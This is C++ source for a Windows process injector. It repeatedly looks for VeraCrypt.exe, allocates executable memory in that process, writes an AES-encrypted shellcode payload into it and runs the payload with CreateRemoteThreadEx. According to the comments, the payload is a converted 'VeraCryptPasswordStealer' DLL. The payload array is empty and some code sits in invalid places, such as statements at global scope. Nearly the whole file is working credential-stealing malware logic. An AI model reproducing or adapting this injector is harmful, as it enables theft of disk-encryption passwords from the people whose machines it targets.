#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <string.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <map>
#include "aes.hpp"

using namespace std;

//python3 .\sRDI\Python\ConvertToShellcode.py ..\PasswordStealer\VeraCryptPasswordStealer.dll -f Go -c -i
//then this payload was encrypted using AES
char AESkey[] = { 0xc8, 0xb7, 0xb6, 0x6, 0xd7, 0x93, 0x4e, 0x18, 0xdb, 0x18, 0x75, 0x0, 0xce, 0x28, 0xc5, 0x52 };
char payload[] = { };
SIZE_T payloadLen = sizeof(payload);
unsigned int keyLen = sizeof(AESkey);
unsigned char iv[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\00";

struct AES_ctx ctx;
AES_init_ctx_iv(&ctx, AESkey, iv);
AES_CBC_decrypt_buffer(&ctx, payload, payloadLen);

// find process ID by process name
int FindMyProc() {
    const WCHAR procnameWCHAR[] = L"VeraCrypt.exe";
    const char procnameCHAR[] = "VeraCrypt.exe";
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        ;
        if (wcscmp(procnameWCHAR, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}
int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}
void InjectStealer(int pid) {
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    PVOID rb; // remote buffer
    PVOID lb; // local buffer

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    char error[100];
    sprintf_s(error, "Open process: %d", GetLastError());
    OutputDebugStringA(error);
    // allocate memory buffer for remote process
    //unsigned int payloadLen = sizeof(payload);
    //unsigned int keyLen = sizeof(AESkey);
    //AESDecrypt(payload, payloadLen, AESkey, keyLen);
    rb = VirtualAllocEx(
        ph,
        NULL,
        payloadLen,
        (MEM_RESERVE | MEM_COMMIT),
        PAGE_EXECUTE_READWRITE
    );
    // "copy" data between processes
    WriteProcessMemory(ph, rb, payload, payloadLen, NULL);

    sprintf_s(error, "WriteProcess: %d", GetLastError());
    OutputDebugStringA(error);
    // our process start new thread
    //rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb,NULL, 0, NULL);   
    sprintf_s(error, "CreateRemoteThread: %d", GetLastError());
    OutputDebugStringA(error);
    //CreateThread(NULL, 0, )
    rt = CreateRemoteThreadEx(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL, NULL);
    CloseHandle(ph);
    CloseHandle(rt);
    sprintf_s(error, "CreateRemoteThreadEx: %d", GetLastError());
    OutputDebugStringA(error);
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
/*
int main(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    unsigned int payload_len = sizeof(payload);

    // Allocate memory for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *) payload, payload_len, (char *) AESkey, sizeof(AESkey));

    // Copy payload to allocated buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Make the buffer executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    // If all good, launch the payload
    if ( rv != 0 ) {
                    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
                    WaitForSingleObject(th, -1);
    }

}
*/

int main(void) {
    map<int, BOOL> processes;
    while (true) {

        OutputDebugStringA("Trying inject into VeraCrypt.exe...");
        int pid = FindMyProc();

        if (pid != 0) {
            if (processes.find(pid) == processes.end()) {
                processes.insert(std::pair<int, BOOL>(pid, TRUE));
                char error[100];
                sprintf_s(error, "PID: %d", processes[pid]);
                OutputDebugStringA(error);
                InjectStealer(pid);
            }
            else {
                OutputDebugStringA("Already hooked...");
            }

        }
        else {
            OutputDebugStringA("Not found...");
        }
        Sleep(5000);
    }

    return 0;
}